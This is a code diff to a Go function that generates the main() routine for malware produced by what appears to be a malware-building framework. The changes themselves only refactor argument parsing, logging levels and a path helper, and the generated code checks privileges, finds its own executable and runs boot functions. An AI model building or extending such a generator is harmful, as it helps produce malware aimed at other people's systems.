@@ -12,14 +12,16 @@ func Generate_main(data_object *json.Json_t) {
 
 	// Create the main function here
 	body := []string{}
-
+	body = append(body, "spine.logging_lvl = \"0\"")
 	// Adds all arguments
-	body = append(body, "arguments.Argument_add(\"--verbose\", \"-v\", false, \"Show all generated logs during runtime\")", "parsed := arguments.Argument_parse()")
+	body = append(body, "parser := argumentparser.Constructor(true)")
+	body = append(body, "parser.Add(\"verbose\", \"-v\", false, false, \"Show all generated logs during runtime\")", "parsed := parser.Parse()")
 	body = append(body, "if _, ok := parsed[\"-v\"]; ok{", "spine.logging_lvl = \"3\"", "}")
 
 	body = append(body, fmt.Sprintf("spine.alpha.alphabet = %s", data_object.Get_alphabet()))
 	body = append(body, "spine.terminate = false")
 	body = append(body, "spine.return_code = 0")
+	body = append(body, "spine.notify_handler.SetLvl(spine.logging_lvl)")
 
 	// Adds all the €1€ - €5€ to the final malware
 	body = append(body, fmt.Sprintf("spine.variable.roof = %d", data_object.Var_max))
@@ -34,7 +36,7 @@ func Generate_main(data_object *json.Json_t) {
 	body = append(body, "spine.check_privileges()")
 
 	// Figures out the malwares current position
-	body = append(body, "spine.path = tools.Grab_executable_path()")
+	body = append(body, "spine.path = gotools.GrabExecutablePath()")
 
 	// Add boot functions
 	for _, boot_name := range data_object.Boot_functions {
@@ -71,7 +73,7 @@ func Generate_main(data_object *json.Json_t) {
 
 	data_object.Add_go_function(functions.Go_func_t{Name: "main", Func_type: "", Part_of_struct: "", Return_type: "", Parameters: []string{}, Gut: body})
 
-	data_object.Add_go_import("github.com/s9rA16Bf4/ArgumentParser/go/arguments")
+	data_object.Add_go_import("github.com/s9rA16Bf4/ArgumentParser")
 	data_object.Add_go_import("os")
 
 }
